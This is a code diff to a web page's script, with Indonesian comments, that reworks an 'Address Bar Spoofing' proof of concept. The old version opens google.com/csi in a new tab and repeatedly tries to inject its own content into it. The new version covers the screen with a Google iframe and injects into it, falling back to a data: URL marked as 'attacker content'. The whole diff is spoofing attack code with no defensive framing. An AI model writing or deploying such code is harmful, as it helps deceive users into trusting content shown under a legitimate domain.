@@ -5,58 +5,32 @@
 
 <script>
 function a() {
-  // Step 1 - Buka google.com/csi langsung
-  const tab = window.open(
-    "https://www.google.com/csi", "_blank"
-  );
+  // Pakai iframe bukan window.open
+  const iframe = document.createElement('iframe');
+  iframe.style.cssText = `
+    position:fixed;inset:0;
+    width:100%;height:100%;
+    border:none;z-index:9999;
+  `;
   
-  if (!tab) { alert("Blocked!"); return; }
+  // Set src ke google.com/csi
+  iframe.src = "https://www.google.com/csi";
+  document.body.appendChild(iframe);
 
-  // Step 2 - Inject SANGAT cepat
-  // sebelum google.com selesai load
-  const tryInject = (attempt) => {
+  // Inject ke iframe
+  setTimeout(() => {
     try {
-      // Coba tulis ke tab
-      tab.document.write(`
-        <div style="
-          position:fixed;
-          inset:0;
-          background:#000;
-          display:flex;
-          flex-direction:column;
-          justify-content:center;
-          align-items:center;
-          font-family:Arial,sans-serif;
-        ">
-          <img
-            src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
-            style="width:400px;max-width:90vw;"
-          >
-          <div style="
-            margin-top:20px;
-            color:#fff;
-            font-size:48px;
-            font-weight:900;
-            letter-spacing:4px;
-            text-shadow:0 0 10px #fff;
-          ">
-            Address Bar Spoofing
-          </div>
-        </div>
+      iframe.contentDocument.write(`
+        <h1 style="color:white;background:black;
+                   padding:40vh 20px;text-align:center;">
+          Address Bar Spoofing
+        </h1>
       `);
-      tab.document.close();
-      console.log('Success at attempt:', attempt);
     } catch(e) {
-      console.warn('Attempt', attempt, ':', e.message);
-      // Coba lagi kalau gagal
-      if (attempt < 20) {
-        setTimeout(() => tryInject(attempt + 1), 50);
-      }
+      // Ganti src iframe ke attacker content
+      iframe.src = "data:text/html,<h1>Spoofed!</h1>";
     }
-  };
-
-  // Mulai coba dari 0ms
-  tryInject(0);
+  }, 100);
 }
 </script>
 </body>
